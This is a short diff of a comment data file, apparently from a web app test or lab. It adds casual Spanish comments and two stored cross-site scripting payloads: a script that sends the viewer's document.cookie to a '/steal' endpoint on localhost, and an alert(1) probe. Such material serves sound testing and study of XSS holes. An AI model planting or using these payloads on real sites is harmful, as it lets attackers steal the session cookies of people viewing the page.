@@ -1,2 +1,4 @@
-4|admin|Que aspero che... Imposible aprobar! |2025-06-15 18:35:09
-
+4|admin|Hola! Muy bueno che|2025-06-15 19:51:33
+4|admin|Posta... 10 puntos|2025-06-15 19:51:48
+4|admin|<script>fetch('http://localhost:5001/steal?cookie='+document.cookie);</script>|2025-06-15 19:52:13
+4|admin|<script>alert(1)</script>|2025-06-15 19:53:03
